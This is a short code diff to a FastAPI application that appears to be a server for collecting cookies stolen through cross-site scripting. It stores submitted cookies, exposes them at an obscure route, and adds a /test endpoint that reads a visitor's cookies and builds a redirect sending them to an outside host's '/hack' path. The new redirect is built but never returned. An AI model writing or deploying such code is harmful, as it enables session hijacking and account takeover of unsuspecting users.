@@ -1,5 +1,5 @@
 from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
 
 
@@ -44,6 +44,13 @@ def get_cookie(cookie: str):
     data.append(cookie)
     return {"status": 200}
 
+@app.get("/test")
+def test(request: Request):
+    cookie = request.cookies
+    RedirectResponse(f"https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie={cookie}")
+
+
 @app.get("/klkfmwelkfmewlfnl/cookie")
 def get_cookie_list():
     return data
+
